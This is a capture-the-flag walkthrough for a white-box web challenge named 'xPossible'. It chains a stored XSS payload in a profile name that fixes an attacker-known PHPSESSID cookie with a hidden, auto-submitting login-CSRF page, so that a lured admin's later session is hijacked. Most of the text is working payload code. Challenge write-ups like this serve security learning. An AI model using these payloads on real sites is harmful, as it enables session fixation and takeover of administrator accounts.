# Exploit `xPossible` chanllenge

## Source
- [challenge source](https://github.com/VoorivexTeam/white-box-challenges/tree/main/xPossible)

## WriteUp

    - login to your user, `user`:`pass`
    - update your profile
    - `name`:
        ```html
            <script>document.cookie="PHPSESSID=7dfd308acefd139c2e834742b2a1fc67; path=/;";window.location='?logout';</script>
        ```
        - this payload will set a valid session id that we have, put your session id, (`PHPSESSID` is in your `cookies`)
    - submit your profile
    - create another page with this code
        ```html
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login Redirector</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 600px;
                    margin: 0 auto;
                    padding: 20px;
                    line-height: 1.6;
                }
                .login-form {
                    display: none; /* Hide the form */
                }
            </style>
        </head>
        <body>
            <h1>Login to xPossible</h1>
            
            <!-- Method 1: Form submission -->
            <div class="login-form">
                <h2>Method 1: Direct Form Submission</h2>
                <form id="loginForm" action="http://mysite.com:10000/index.php" method="POST">
                    <input type="text" name="username" placeholder="Username" value="user" required>
                    <input type="password" name="password" placeholder="Password" value="pass" required>
                    <input type="hidden" name="login" value="1">
                    <button type="submit">Login</button>
                </form>
            </div>

            <script>
                // Automatically submit the form when page loads
                window.onload = function() {
                    document.getElementById('loginForm').submit();
                };
                //"<script>document.cookie="PHPSESSID=7dfd308acefd139c2e834742b2a1fc67; path=/;";window.location='?logout';</script>"
            </script>
        </body>
        </html>

        ```
        - code will login to your account and make that XSS payload run, when the `victim` visit this page, will login to your account, and logout base on your XSS
    - give this page to a admin, when the admin visit this page, will logged in to your account, make the XSS to run, and then logged out
    - next time the admin logged in to his/her account, the data will be saved on the session that you wrote with your XSS
    - just put the `PHPSESSID` in your `cookies` and you are in admin account.